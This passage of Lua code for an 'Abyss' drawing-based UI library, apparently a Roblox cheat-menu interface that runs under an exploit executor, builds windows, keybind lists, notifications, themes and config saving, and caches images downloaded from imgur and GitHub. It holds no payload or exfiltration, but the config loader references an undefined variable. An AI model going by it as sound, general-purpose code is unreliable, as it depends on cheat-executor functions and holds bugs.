                    Instance.Size = Library.Theme.TextSize
                end
            end
        end
        --
        if Properties.ZIndex ~= nil then
            Instance.ZIndex = Properties.ZIndex + 20
        else
            Instance.ZIndex = 20
        end
        --
        Location = Location or Library.Drawings
        if InstanceType == ""Image"" then
            Location[#Location + 1] = {Instance, true}
        else
            Location[#Location + 1] = {Instance}
        end
        --
        return Instance
    end
    --
    Utility.OnMouse = function(Instance)
        local Mouse = UserInput:GetMouseLocation()
        if Instance.Visible and (Mouse.X > Instance.Position.X) and (Mouse.X < Instance.Position.X + Instance.Size.X) and (Mouse.Y > Instance.Position.Y) and (Mouse.Y < Instance.Position.Y + Instance.Size.Y) then
            if Library.WindowVisible then
                return true
            end
        end
    end
    --
    Utility.Rounding = function(Num, DecimalPlaces)
        return tonumber(string.format(""%."" .. (DecimalPlaces or 0) .. ""f"", Num))
    end
    --
    Utility.AddDrag = function(Sensor, List)
        local DragUtility = {
            MouseStart = Vector2.new(), MouseEnd = Vector2.new(), Dragging = false
        }
        --
        Utility.AddConnection(UserInput.InputBegan, function(Input)
            if Input.UserInputType == Enum.UserInputType.MouseButton1 then
                if Utility.OnMouse(Sensor) then
                    DragUtility.Dragging = true
                end
            end
        end)
        --
        Utility.AddConnection(UserInput.InputEnded, function(Input)
            if Input.UserInputType == Enum.UserInputType.MouseButton1 then
                DragUtility.Dragging = false
            end
        end)
        --
        Utility.AddConnection(RunService.RenderStepped, function()
            DragUtility.MouseStart = UserInput:GetMouseLocation()
            --
            for Index, Value in pairs(List) do
                if Index ~= nil and Value ~= nil then
                    if DragUtility.Dragging then
                        Value[1].Position = Vector2.new(
                            Value[1].Position.X + (DragUtility.MouseStart.X - DragUtility.MouseEnd.X), 
                            Value[1].Position.Y + (DragUtility.MouseStart.Y - DragUtility.MouseEnd.Y)
                        )
                    end
                end
            end
            --
            DragUtility.MouseEnd = UserInput:GetMouseLocation()
        end)
    end
    --
    Utility.AddCursor = function(Instance)
        local CursorOutline = Utility.AddDrawing(""Triangle"", {
            Color = Library.Theme.Accent[1],
            Thickness = 1,
            Filled = false,
            ZIndex = 5
        }, Library.Ignores)
        --
        local Cursor = Utility.AddDrawing(""Triangle"", {
            Color = Library.Theme.Accent[1],
            Thickness = 3,
            Filled = true,
            Transparency = 1,
            ZIndex = 5
        }, Library.Ignores)
        --
        Utility.AddConnection(Library.Communication.Event, function(Type, Color)
            if Type == ""Accent"" then
                Cursor.Color = Color
                CursorOutline.Color = Color
            end
        end)
        --
        Utility.AddConnection(RunService.RenderStepped, function()
            local Mouse = UserInput:GetMouseLocation()
            --
            if Library.WindowVisible then
                CursorOutline.Visible = true
                CursorOutline.PointA = Vector2.new(Mouse.X, Mouse.Y)
                CursorOutline.PointB = Vector2.new(Mouse.X + 15, Mouse.Y + 5)
                CursorOutline.PointC = Vector2.new(Mouse.X + 5, Mouse.Y + 15)

                Cursor.Visible = true
                Cursor.PointA = Vector2.new(Mouse.X, Mouse.Y)
                Cursor.PointB = Vector2.new(Mouse.X + 15, Mouse.Y + 5)
                Cursor.PointC = Vector2.new(Mouse.X + 5, Mouse.Y + 15)
            else
                CursorOutline.Visible = false
                Cursor.Visible = false
            end
        end)
    end
    --
    Utility.MiddlePos = function(Instance)
        return Vector2.new(
            (Camera.ViewportSize.X / 2) - (Instance.Size.X / 2), 
            (Camera.ViewportSize.Y / 2) - (Instance.Size.Y / 2)
        )
    end
    --
    Utility.SaveConfig = function(Config)
        writefile(
            ""Abyss/Configs/"" .. tostring(game.PlaceId) .. ""/"" .. Config .. "".json"", 
            HttpService:JSONEncode(UISettings.Flags)
        )
    end
    --
    Utility.DeleteConfig = function(Config)
        delfile(
            ""Abyss/Configs/"" .. tostring(game.PlaceId) .. ""/"" .. Config .. "".json""
        )
    end
    --
    Utility.LoadConfig = function(Config)
        local Config = HttpService:JSONDecode(readfile(""Abyss/Configs/"" .. tostring(game.PlaceId) .. ""/"" .. Config .. "".json""))
        --
        Library.Flags = LoadedConfig
        --
        for Index, Value in pairs(Library.Flags) do
            if Library.Items[Index].TypeOf == ""Keybind"" then
                Library.Items[Index]:Set(Value[1], Value[2], Value[3], true)
            elseif Library.Items[Index].TypeOf == ""Colorpicker"" then
                Library.Items[Index]:SetHue(Value[1])
                Library.Items[Index]:SetSaturationX(Value[2])
                Library.Items[Index]:SetSaturationY(Value[3])
            else
                Library.Items[Index]:Set(Value)
            end
        end
        --
        rconsoleinfo(""Debug: Loaded a config! 0 error."")
    end
    --
    Utility.AddFolder = function(GetFolder)
        local Folder = isfolder(GetFolder)
        --
        if Folder then
            return
        else
            makefolder(GetFolder)
            return true
        end
    end
    --
    Utility.AddImage = function(Image, Url, UI)
        local ImageFile = nil
        --
        if isfile(Image) then
            ImageFile = readfile(Image)
        else
            ImageFile = game:HttpGet(Url)
            writefile(Image, ImageFile)
        end
        --
        return ImageFile
    end
end
--
do
    function Library.CreateLoader(Title, WindowSize)
        local Window = {
            Max = 2, Current = 0
        }
        --
        Library.Theme.Logo = Utility.AddImage(""Abyss/Assets/UI/Logo2.png"", ""https://i.imgur.com/HI4UTmZ.png"")
        --
        local WindowOutline = Utility.AddDrawing(""Square"", {
            Size = WindowSize,
            Thickness = 0,
            Color = Library.Theme.Outline,
            Visible = true,
            Filled = true
        })
        --
        WindowOutline.Position = Utility.MiddlePos(WindowOutline)
        --
        local WindowOutlineBorder = Utility.AddDrawing(""Square"", {
            Size = Vector2.new(WindowOutline.Size.X - 2, WindowOutline.Size.Y - 2),
            Position = Vector2.new(WindowOutline.Position.X + 1, WindowOutline.Position.Y + 1),
            Thickness = 0,
            Color = Library.Theme.Accent[1],
            Visible = true,
            Filled = true
        })
        --
        local WindowFrame = Utility.AddDrawing(""Square"", {
            Size = Vector2.new(WindowOutlineBorder.Size.X - 2, WindowOutlineBorder.Size.Y - 2),
            Position = Vector2.new(WindowOutlineBorder.Position.X + 1, WindowOutlineBorder.Position.Y + 1),
            Thickness = 0,
            Transparency = 1,
            Color = Library.Theme.DarkContrast,
            Visible = true,
            Filled = true
        })
        --
        local WindowTopline = Utility.AddDrawing(""Square"", {
            Size = Vector2.new(WindowOutline.Size.X - 2, 2),
            Position = Vector2.new(WindowOutlineBorder.Position.X, WindowOutlineBorder.Position.Y),
            Thickness = 0,
            Color = Library.Theme.Accent[1],
            Visible = false,
            Filled = true
        })
        --
        local WindowImage = Utility.AddDrawing(""Image"", {
            Size = WindowFrame.Size,
            Position = WindowFrame.Position,
            Transparency = 1, 
            Visible = true,
            Data = Library.Theme.Gradient
        })
        --
        local WindowTitle = Utility.AddDrawing(""Text"", {
            Font = Library.Theme.Font,
            Size = Library.Theme.TextSize,
            Color = Library.Theme.Text,
            Text = Title,
            Position = Vector2.new(WindowFrame.Position.X + (WindowFrame.Size.X / 2), WindowOutlineBorder.Position.Y + 8),
            Visible = true,
            Center = true,
            Outline = false
        })
        --
        local WindowText = Utility.AddDrawing(""Text"", {
            Font = Library.Theme.Font,
            Size = Library.Theme.TextSize,
            Color = Library.Theme.Text,
            Visible = true,
            Center = true,
            Outline = false
        })
        --
        local SliderInline = Utility.AddDrawing(""Square"", {
            Size = Vector2.new(205, 15),
            Color = Library.Theme.Inline,
            Position = Vector2.new(WindowFrame.Position.X + (WindowFrame.Size.X / 2), WindowOutlineBorder.Position.Y + 8),
            Transparency = 0.75,
            Thickness = 0,
            Visible = true,
            Filled = true
        })
        --
        local SliderOutline = Utility.AddDrawing(""Square"", {
            Size = Vector2.new(SliderInline.Size.X - 2, SliderInline.Size.Y - 2),
            Color = Library.Theme.Outline,
            Transparency = 0.5,
            Thickness = 0,
            Visible = true,
            Filled = true
        })
        --
        local SliderFrame = Utility.AddDrawing(""Square"", {
            Size = Vector2.new(((SliderInline.Size.X - 2) / (Window.Max / math.clamp(Window.Current, 0, Window.Max))), SliderInline.Size.Y - 2),
            Color = Library.Theme.Accent[1],
            Transparency = 0.75,
            Thickness = 0,
            Visible = true,
            Filled = true
        })
        --
        local SliderFrameShader = Utility.AddDrawing(""Image"", {
            Size = Vector2.new(SliderInline.Size.X - 2, SliderInline.Size.Y - 2),
            Transparency = 1, 
            Visible = true,
            Data = Library.Theme.Gradient
        })
        --
        local MiddleIcon = Utility.AddDrawing(""Image"", {
            Size = Vector2.new(175, 175),
            Rounding = 5,
            Transparency = 1, 
            Visible = true,
            Data = Library.Theme.Logo
        })
        --
        MiddleIcon.Position = Vector2.new(WindowOutline.Position.X + (WindowOutline.Size.X / 2) - (MiddleIcon.Size.X / 2), WindowOutline.Position.Y + (WindowOutline.Size.Y / 2) - (MiddleIcon.Size.Y / 2) - 15)
        --
        Window.SetText = function(Val, Txt)
            SliderFrame.Size = Vector2.new(((SliderInline.Size.X - 2) / (Window.Max / math.clamp(Val, 0, Window.Max))), SliderInline.Size.Y - 2)
            WindowText.Text = Txt
        end
        --
        SliderInline.Position = Vector2.new(WindowOutline.Position.X + (WindowOutline.Size.X / 2) - (SliderOutline.Size.X / 2), (WindowOutline.Position.Y + WindowOutline.Size.Y) - 30)
        SliderOutline.Position = Vector2.new(SliderInline.Position.X + 1, SliderInline.Position.Y + 1)
        SliderFrame.Position = Vector2.new(SliderInline.Position.X + 1, SliderInline.Position.Y + 1)
        SliderFrameShader.Position = Vector2.new(SliderInline.Position.X + 1, SliderInline.Position.Y + 1)
        WindowText.Position = Vector2.new(WindowFrame.Position.X + (WindowFrame.Size.X / 2), SliderInline.Position.Y - 16)
        --
        Window.SetText(0, ""UI Initialization [ Downloading ]"")
        --
        Utility.AddFolder(""Abyss"")
        Utility.AddFolder(""Abyss/Caches"")
        Utility.AddFolder(""Abyss/Assets"")
        Utility.AddFolder(""Abyss/Assets/UI"")
        Utility.AddFolder(""Abyss/Configs"")
        Utility.AddFolder(""Abyss/Scripts"")
        --
        Library.Theme.Gradient = Utility.AddImage(""Abyss/Assets/UI/Gradient.png"", ""https://raw.githubusercontent.com/mvonwalk/Exterium/main/Gradient.png"")
        -- Library.Theme.SecondIcon = Utility.AddImage(""Abyss/Assets/UI/Gradient.png"", ""https://raw.githubusercontent.com/mvonwalk/Exterium/main/Gradient.png"")
        Library.Theme.Hue = Utility.AddImage(""Abyss/Assets/UI/Hue.png"", ""https://raw.githubusercontent.com/mvonwalk/Exterium/main/HuePicker.png"")
        Library.Theme.Saturation = Utility.AddImage(""Abyss/Assets/UI/Saturation.png"", ""https://raw.githubusercontent.com/mvonwalk/Exterium/main/SaturationPicker.png"")
        Library.Theme.SaturationCursor = Utility.AddImage(""Abyss/Assets/UI/HueCursor.png"", ""https://raw.githubusercontent.com/mvonwalk/splix-assets/main/Images-cursor.png"")
        --
        Library.Theme.Astolfo = Utility.AddImage(""Abyss/Assets/UI/Astolfo.png"", ""https://i.imgur.com/T20cWY9.png"")
        Library.Theme.Aiko = Utility.AddImage(""Abyss/Assets/UI/Aiko.png"", ""https://i.imgur.com/1gRIdko.png"")
        Library.Theme.Rem = Utility.AddImage(""Abyss/Assets/UI/Rem.png"", ""https://i.imgur.com/ykbRkhJ.png"")
        Library.Theme.Violet = Utility.AddImage(""Abyss/Assets/UI/Violet.png"", ""https://i.imgur.com/7B56w4a.png"")
        Library.Theme.Asuka = Utility.AddImage(""Abyss/Assets/UI/Asuka.png"", ""https://i.imgur.com/3hwztNM.png"")
        --
        Window.SetText(1, ""Checking Assets"")
        --
        Window.SetText(1, ""Checking Input"")
        Utility.CLCheck(Window)
        --
        Window.SetText(2, ""Finished"")
        --
        Utility.RemoveDrawing(WindowOutline)
        Utility.RemoveDrawing(WindowOutlineBorder)
        Utility.RemoveDrawing(WindowTopline)
        Utility.RemoveDrawing(WindowFrame)
        Utility.RemoveDrawing(WindowTitle)
        Utility.RemoveDrawing(WindowText)
        Utility.RemoveDrawing(SliderOutline)
        Utility.RemoveDrawing(SliderInline)
        Utility.RemoveDrawing(SliderFrame)
        Utility.RemoveDrawing(SliderFrameShader)
        Utility.RemoveDrawing(MiddleIcon)
        Utility.RemoveDrawing(WindowImage)
        --
        UserInput.MouseIconEnabled = false
        --
        return Window
    end
end
--
do
    --
    function Library:ChangeVisible(State)
        Library.WindowVisible = State
        UserInput.MouseIconEnabled = not Library.WindowVisible
        for Idx, Val in pairs(Library.Drawings) do
            if Val[2] then
                Val[1].Transparency = Library.WindowVisible and 1 or 0
            else
                if Val[1].Color ~= Library.Theme.Hitbox then
                    Val[1].Transparency = Library.WindowVisible and 1 or 0
                end
            end
        end
    end
    --
    function Library:UpdateTheme(Config)
        if Config.Accent ~= nil then
            Library.Theme.Accent[1] = Config.Accent
            Library.Communication:Fire(""Accent"", Config.Accent)
        end
        if Config.Outline ~= nil then
            Library.Theme.Outline = Config.Outline
            Library.Communication:Fire(""Outline"", Config.Outline)
        end
        if Config.Inline ~= nil then
            Library.Theme.Inline = Config.Inline
            Library.Communication:Fire(""Inline"", Config.Inline)
        end
        if Config.LightContrast ~= nil then
            Library.Theme.LightContrast = Config.LightContrast
            Library.Communication:Fire(""LightContrast"", Config.LightContrast)
        end
        if Config.DarkContrast ~= nil then
            Library.Theme.DarkContrast = Config.DarkContrast
            Library.Communication:Fire(""DarkContrast"", Config.DarkContrast)
        end
    end
    --
    function Library.SelfDestruct()
        --
        UserInput.MouseIconEnabled = true
        --
        for Index, Value in pairs(Library.Connections) do
            Value:Disconnect()
        end
        --
        for Index, Value in pairs(Library.Drawings) do
            if Value[1] then    
                Value[1]:Remove()
            end
        end
        --
        for Index, Value in pairs(Library.Watermark) do
            if Value[1] then
                Value[1]:Remove()
            end
        end
        --
        for Index, Value in pairs(Library.Keybind) do
            if Value[1] then
                Value[1]:Remove()
            end
        end
        --
        for Index, Value in pairs(Library.Ignores) do
            if Value[1] then
                Value[1]:Remove()
            end
        end
        --
        Library.Drawings = {}
        Library.Watermark = {}
        Library.Keybind = {}
        Library.Ignores = {}
        --
    end
    --
    function Library.Window(Title, Size)
        local Window = {
            Notification = 0,
            Tabs = {},
            LastTab = nil,
            SelectedTab = nil,
            BindList = """"
        }
        --
        local Blur = Utility.AddDrawing(""Image"", {
            Position = Vector2.new(0, 0),
            Size = Vector2.new(1920, 1080),
            Transparency = 0,
            Visible = true,
        }, Library.Ignores)
        --
        do
            local WindowOutline = Utility.AddDrawing(""Square"", {
                Size = Vector2.new(120, 20),
                Thickness = 0,  
                Color = Library.Theme.Outline,
                Visible = true,
                Filled = true
            }, Library.Keybind)
            --
            WindowOutline.Position = Vector2.new(10, (Camera.ViewportSize.Y / 2) - (WindowOutline.Size.Y / 2))
            --
            local WindowOutlineBorder = Utility.AddDrawing(""Square"", {
                Size = Vector2.new(WindowOutline.Size.X - 2, WindowOutline.Size.Y - 2),
                Position = Vector2.new(WindowOutline.Position.X + 1, WindowOutline.Position.Y + 1),
                Thickness = 0,
                Color = Library.Theme.Accent[1],
                Visible = false,
                Filled = true
            }, Library.Keybind)
            --
            local WindowFrame = Utility.AddDrawing(""Square"", {
                Size = Vector2.new(WindowOutlineBorder.Size.X - 2, WindowOutlineBorder.Size.Y - 2),
                Position = Vector2.new(WindowOutlineBorder.Position.X + 1, WindowOutlineBorder.Position.Y + 1),
                Thickness = 0,
                Transparency = 1,
                Color = Library.Theme.DarkContrast,
                Visible = true,
                Filled = true
            }, Library.Keybind)
            --
            local WindowTopline = Utility.AddDrawing(""Square"", {
                Size = Vector2.new(WindowOutlineBorder.Size.X, 1),
                Position = Vector2.new(WindowOutlineBorder.Position.X, WindowOutlineBorder.Position.Y),
                Thickness = 0,
                Color = Library.Theme.Accent[1],
                Visible = true,
                Filled = true
            }, Library.Keybind)
            --
            local WindowImage = Utility.AddDrawing(""Image"", {
                Size = WindowFrame.Size,
                Position = WindowFrame.Position,
                Transparency = 1, 
                Visible = true,
                Data = Library.Theme.Gradient
            }, Library.Keybind)
            --
            local WindowText = Utility.AddDrawing(""Text"", {
                Font = Library.Theme.Font,
                Size = Library.Theme.TextSize,
                Color = Library.Theme.Text,
                Text = ""Keybinds"",
                Position = Vector2.new(WindowOutlineBorder.Position.X + (WindowOutlineBorder.Size.X / 2), WindowOutlineBorder.Position.Y + 2),
                Visible = true,
                Center = true,
                Outline = false
            }, Library.Keybind)
            --
            local CurrentBinds = Utility.AddDrawing(""Text"", {
                Font = Library.Theme.Font,
                Size = Library.Theme.TextSize,
                Color = Library.Theme.Text,
                Text = """",
                Position = Vector2.new(WindowOutlineBorder.Position.X + 3, WindowOutlineBorder.Position.Y + 8),
                Visible = true,
                Center = false,
                Outline = false
            }, Library.Keybind)
            --
            Utility.AddConnection(RunService.RenderStepped, function(Type, Color)
                CurrentBinds.Text = Window.BindList

                local CalcuationSize = CurrentBinds.Text ~= """" and Vector2.new(CurrentBinds.TextBounds.X >= 120 and CurrentBinds.TextBounds.X + 6 or 120, 20 + CurrentBinds.TextBounds.Y - 6) or Vector2.new(120, 20)
                WindowOutline.Size = CalcuationSize
                
                WindowOutlineBorder.Size = Vector2.new(WindowOutline.Size.X - 2, WindowOutline.Size.Y - 2)
                WindowOutlineBorder.Position = Vector2.new(WindowOutline.Position.X + 1, WindowOutline.Position.Y + 1)

                WindowTopline.Size = Vector2.new(WindowOutlineBorder.Size.X, 1)
                WindowTopline.Position = Vector2.new(WindowOutlineBorder.Position.X, WindowOutlineBorder.Position.Y)

                WindowImage.Size = WindowFrame.Size
                WindowImage.Position = WindowFrame.Position

                WindowText.Position = Vector2.new(WindowOutlineBorder.Position.X + (WindowOutlineBorder.Size.X / 2), WindowOutlineBorder.Position.Y + 2)
            end)
            --
            Utility.AddDrag(WindowOutline, Library.Keybind)
            --
            Utility.AddConnection(Library.Communication.Event, function(Type, Color)
                if Type == ""Accent"" then
                    WindowOutlineBorder.Color = Color
                    WindowTopline.Color = Color
                elseif Type == ""Outline"" then
                    WindowOutline.Color = Color
                elseif Type == ""DarkContrast"" then
                    WindowFrame.Color = Color
                elseif Type == ""Text"" then
                    WindowText.Color = Color
                end
            end)
        end
        --
        local Anime = Utility.AddDrawing(""Image"", {
            Transparency = 0.5, 
            Visible = false
        }, Library.Ignores)
        --
        local WindowOutline = Utility.AddDrawing(""Square"", {
            Size = Size,
            Thickness = 0,
            Color = Library.Theme.Outline,
            Visible = true,
            Filled = true
        })
        --
        WindowOutline.Position = Utility.MiddlePos(WindowOutline)
        --
        local WindowOutlineBorder = Utility.AddDrawing(""Square"", {
            Size = Vector2.new(WindowOutline.Size.X - 2, WindowOutline.Size.Y - 2),
            Position = Vector2.new(WindowOutline.Position.X + 1, WindowOutline.Position.Y + 1),
            Thickness = 0,
            Color = Library.Theme.Accent[1],
            Visible = true,
            Filled = true
        })
        --
        local WindowFrame = Utility.AddDrawing(""Square"", {
            Size = Vector2.new(WindowOutlineBorder.Size.X - 2, WindowOutlineBorder.Size.Y - 2),
            Position = Vector2.new(WindowOutlineBorder.Position.X + 1, WindowOutlineBorder.Position.Y + 1),
            Thickness = 0,
            Transparency = 1,
            Color = Library.Theme.DarkContrast,
            Visible = true,
            Filled = true
        })
        --
        local WatermarkIcon = Utility.AddDrawing(""Image"", {
            Size = Vector2.new(70, 70),
            Position = Vector2.new(WindowFrame.Position.X + (WindowFrame.Size.X / 2) - 35, WindowFrame.Position.Y - 4),
            Transparency = 1,
            ZIndex = 3,
            Visible = false,
            Data = Library.Theme.Logo
        })
        --
        Utility.AddCursor(WindowFrame)
        --
        local WindowHeader = Utility.AddDrawing(""Square"", {
            Size = Vector2.new(WindowOutlineBorder.Size.X - 2, 70),
            Position = Vector2.new(WindowOutlineBorder.Position.X + 1, WindowOutlineBorder.Position.Y + 1),
            Thickness = 0,
            Transparency = 0,
            Color = Library.Theme.Hitbox,
            Visible = true,
            Filled = true
        })
        --
        Utility.AddDrag(WindowHeader, Library.Drawings)
        --
        local WindowTopline = Utility.AddDrawing(""Square"", {
            Size = Vector2.new(WindowOutlineBorder.Size.X, 1),
            Position = Vector2.new(WindowOutlineBorder.Position.X, WindowOutlineBorder.Position.Y),
            Thickness = 0,
            Color = Library.Theme.Accent[1],
            Visible = false,
            Filled = true
        })
        --
        local WindowImage = Utility.AddDrawing(""Image"", {
            Size = WindowFrame.Size,
            Position = WindowFrame.Position,
            Transparency = 1, 
            Visible = true,
            Data = Library.Theme.Gradient
        })
        --
        local WindowTitle = Utility.AddDrawing(""Text"", {
            Font = Library.Theme.Font,
            Size = Library.Theme.TextSize,
            Color = Library.Theme.Text,
            Text = Title,
            Position = Vector2.new(WindowOutlineBorder.Position.X + 8, WindowOutlineBorder.Position.Y + 6),
            Visible = true,
            Center = false,
            Outline = false
        })
        --
        local SecondBorderInline = Utility.AddDrawing(""Square"", {
            Size = Vector2.new(Size.X - 17, Size.Y - 50),
            Position = Vector2.new(WindowOutlineBorder.Position.X + 8, WindowOutlineBorder.Position.Y + 42),
            Thickness = 0,
            Color = Library.Theme.Inline,
            Visible = true,
            Filled = true
        })
        --
        local SecondBorderOutline = Utility.AddDrawing(""Square"", {
            Size = Vector2.new(SecondBorderInline.Size.X - 2, SecondBorderInline.Size.Y - 2),
            Position = Vector2.new(SecondBorderInline.Position.X + 1, SecondBorderInline.Position.Y + 1),
            Thickness = 0,
            Color = Library.Theme.LightContrast,
            Visible = true,
            Filled = true
        })
        --
        local TabLine = Utility.AddDrawing(""Square"", {
            Thickness = 0,
            Color = Library.Theme.Accent[1], --Library.Theme.Outline,
            Visible = true,
            Filled = true,
            ZIndex = 2
        })
        --
        local DisableLine = Utility.AddDrawing(""Square"", {
            Thickness = 0,
            Color = Library.Theme.LightContrast, --Library.Theme.Outline,
            Visible = true,
            Filled = true,
            ZIndex = 3
        })
        --
        Utility.AddConnection(Library.Communication.Event, function(Type, Color)
            if Type == ""Accent"" then
                WindowOutlineBorder.Color = Color
                WindowTopline.Color = Color
                TabLine.Color = Color
            elseif Type == ""Outline"" then
                WindowOutline.Color = Color
            elseif Type == ""LightContrast"" then
                DisableLine.Color = Color
                SecondBorderOutline.Color = Color
            elseif Type == ""DarkContrast"" then
                WindowFrame.Color = Color
            elseif Type == ""Text"" then
                WindowTitle.Color = Color
            elseif Type == ""Inline"" then
                SecondBorderInline.Color = Color
            end
        end)
        --
        Window[""PageCover""] = SecondBorderInline
        --
        function Window.ChangeAnime(Name)
            Anime.Data = (
                Name == ""Astolfo"" and Library.Theme.Astolfo or
                Name == ""Aiko"" and Library.Theme.Aiko or
                Name == ""Rem"" and Library.Theme.Rem or
                Name == ""Violet"" and Library.Theme.Violet or
                Name == ""Asuka"" and Library.Theme.Asuka
            )

            Anime.Size = (
                Name == ""Astolfo"" and Vector2.new(412, 605) or
                Name == ""Aiko"" and Vector2.new(390, 630) or
                Name == ""Rem"" and Vector2.new(390, 639) or
                Name == ""Violet"" and Vector2.new(1029 / 3, 1497 / 3) or
                Name == ""Asuka"" and Vector2.new(415, 601)
            )

            Anime.Position = Vector2.new(Camera.ViewportSize.X - 400, Camera.ViewportSize.Y - Anime.Size.Y)
        end
        --
        function Window.ToggleAnime(State)
            Anime.Visible = State
        end
        --
        function Window.SendNotification(Type, Title, Duration)
            local Notification, Removed = Window.Notification, false
            --
            local NotificationInline = Utility.AddDrawing(""Square"", {
                Size = Vector2.new(0, 21),
                Position = Vector2.new(0, (Window.Notification * 25) + 100),
                Thickness = 0,
                Color = Library.Theme.Inline,
                Visible = true,
                Filled = true
            }, Library.Ignores)
            --
            local NotificationOutline = Utility.AddDrawing(""Square"", {
                Size = Vector2.new(0, NotificationInline.Size.Y - 1),
                Position = Vector2.new(NotificationInline.Position.X + 2, NotificationInline.Position.Y + 2),
                Thickness = 0,
                Color = Library.Theme.DarkContrast,
                Visible = true,
                Filled = true
            }, Library.Ignores)
            --
            local NotificationOutlineBorder = Utility.AddDrawing(""Square"", {
                Size = Vector2.new(NotificationOutline.Size.X - 2, NotificationOutline.Size.Y + 5),
                Position = Vector2.new(NotificationOutline.Position.X + 1, NotificationOutline.Position.Y + 1),
                Thickness = 0,
                Color = Library.Theme.Accent[1],
                Visible = false,
                Filled = true
            }, Library.Ignores)
            --
            local NotificationTopline = Utility.AddDrawing(""Square"", {
                Size = Vector2.new(NotificationOutline.Size.X, 1),
                Position = Vector2.new(NotificationOutline.Position.X, NotificationOutline.Position.Y),
                Thickness = 0,
                Color = Type == ""Warning"" and Library.Theme.Notification.Warning or Type == ""Error"" and Library.Theme.Notification.Error or Library.Theme.DarkContrast,
                Visible = Type == ""Warning"" or Type == ""Error"",
                Filled = true
            }, Library.Ignores)
            --
            local NotificationLeftline = Utility.AddDrawing(""Square"", {
                Size = Vector2.new(1, NotificationOutline.Size.Y),
                Position = Vector2.new(NotificationOutline.Position.X, NotificationOutline.Position.Y),
                Thickness = 0,
                Color = Type == ""Normal"" and Library.Theme.Accent[1] or Library.Theme.DarkContrast,
                Visible = Type == ""Normal"",
                Filled = true
            }, Library.Ignores)
            --
            local NotificationImage = Utility.AddDrawing(""Image"", {
                Size = NotificationOutlineBorder.Size,
                Position = NotificationOutlineBorder.Position,
                Transparency = 1, 
                Visible = true,
                Data = Library.Theme.Gradient
            }, Library.Ignores)
            --
            local NotificationText = Utility.AddDrawing(""Text"", {
                Font = Library.Theme.Font,
                Size = Library.Theme.TextSize,
                Color = Library.Theme.Text,
                Text = Title,
                Position = Vector2.new(NotificationOutlineBorder.Position.X + 6, NotificationOutlineBorder.Position.Y + 3),
                Visible = true,
                Center = false,
                Outline = false
            }, Library.Ignores)
            --
            NotificationInline.Size = Vector2.new(NotificationText.TextBounds.X + 15, 21)
            --
            NotificationOutline.Size = Vector2.new(NotificationInline.Size.X - 1, NotificationInline.Size.Y - 1)
            NotificationOutline.Position = Vector2.new(NotificationInline.Position.X + 2, NotificationInline.Position.Y + 2)
            --
            NotificationOutlineBorder.Size = Vector2.new(NotificationOutline.Size.X - 2, NotificationOutline.Size.Y - 2)
            NotificationOutlineBorder.Position = Vector2.new(NotificationOutline.Position.X + 1, NotificationOutline.Position.Y + 1)
            --
            NotificationLeftline.Size = Vector2.new(2, NotificationOutline.Size.Y)
            --
            NotificationTopline.Size = Vector2.new(NotificationOutline.Size.X, 1)
            --
            NotificationImage.Size = NotificationOutline.Size
            NotificationImage.Position = NotificationOutline.Position
            --
            task.spawn(function()
                for Index = -100, 0, 2 do
                    pcall(function()
                        NotificationInline.Position = Vector2.new(Index, (Notification * 25) + 100)
                        NotificationOutline.Position = Vector2.new(NotificationInline.Position.X + 2, NotificationInline.Position.Y + 2)
                        NotificationOutlineBorder.Position = Vector2.new(NotificationOutline.Position.X + 2, NotificationOutline.Position.Y + 2)
                        NotificationText.Position = Vector2.new(NotificationOutline.Position.X + 6, NotificationOutline.Position.Y + 3)
                        NotificationTopline.Position = Vector2.new(NotificationOutline.Position.X, NotificationOutline.Position.Y)
                        NotificationImage.Position = NotificationOutline.Position
                        NotificationLeftline.Position = Vector2.new(NotificationOutline.Position.X, NotificationOutline.Position.Y)
                    end)
                    task.wait()
                end
            end)
            --
            Utility.AddConnection(Library.Communication.Event, function(Type)
                if Type == ""UpdateNotification"" then
                    Notification -= 1
                    pcall(function()
                        NotificationInline.Size = Vector2.new(Index, (Notification * 25) + 100)
                        NotificationOutline.Position = Vector2.new(NotificationInline.Position.X + 2, NotificationInline.Position.Y + 2)
                        NotificationText.Position = Vector2.new(NotificationOutline.Position.X + 6, NotificationOutline.Position.Y + 3)
                        NotificationTopline.Position = Vector2.new(NotificationOutline.Position.X, NotificationOutline.Position.Y)
                        NotificationImage.Position = NotificationOutline.Position
                        NotificationLeftline.Position = Vector2.new(NotificationOutline.Position.X, NotificationOutline.Position.Y)
                    end)
                end
            end)
            --
            Window.Notification += 1
            --
            task.spawn(function()
                task.wait(Duration)
                --
                pcall(function()
                    Utility.RemoveDrawing(NotificationInline, Library.Ignores)
                    Utility.RemoveDrawing(NotificationLeftline, Library.Ignores)
                    Utility.RemoveDrawing(NotificationOutline, Library.Ignores)
                    Utility.RemoveDrawing(NotificationOutlineBorder, Library.Ignores)
                    Utility.RemoveDrawing(NotificationText, Library.Ignores)
                    Utility.RemoveDrawing(NotificationTopline, Library.Ignores)
                    Utility.RemoveDrawing(NotificationImage, Library.Ignores)
                end)
                --
                Library.Communication:Fire(""UpdateNotification"")
                --
                Window.Notification -= 1
            end)
        end
        --
        function Window:RefreshPages()
            for Index, Value in pairs(Window.Tabs) do
                Value:Resize(Index)
            end
        end
        --
        function Window:SwitchTab(Tab)
            for Index, Value in pairs(self.Tabs) do
                Value[""TabTitle""].Color = Library.Theme.TextInactive
                Value[""TabOutline""].Color = Library.Theme.DarkContrast

                for _, Render in pairs(Value[""Render""]) do
                    Render.Visible = false
                end
            end

            Tab[""TabOutline""].Color = Library.Theme.LightContrast
            Tab[""TabTitle""].Color = Library.Theme.Text

            TabLine.Size = Vector2.new(Tab[""TabOutline""].Size.X, 1)
            TabLine.Position = Vector2.new(Tab[""TabOutline""].Position.X, Tab[""TabOutline""].Position.Y)
            DisableLine.Size = Vector2.new(Tab[""TabOutline""].Size.X, 1)
            DisableLine.Position = Vector2.new(Tab[""TabOutline""].Position.X, Tab[""TabOutline""].Position.Y + Tab[""TabOutline""].Size.Y)
            Window.SelectedTab = Tab.CurrentTab

            for _, Render in pairs(Tab[""Render""]) do
                Render.Visible = true
            end
        end
        --
        function Window:Tab(Title)
            local Tab = {
                Visible = {},
                SectionAxis = {0, 0},
                Sections = {},
                Dropdowns = {
                    [""Left""] = {}, 
                    [""Right""] = {}
                },
                CurrentTab = #self.Tabs
            }
            --
            local TabInline = Utility.AddDrawing(""Square"", {
                Position = Vector2.new(SecondBorderInline.Position.X, SecondBorderOutline.Position.Y - 20),
                Size = Vector2.new(0, 20),
                Thickness = 0,
                Color = Library.Theme.Inline,
                Visible = true,
                Filled = true
            })
            --
            local TabOutline = Utility.AddDrawing(""Square"", {
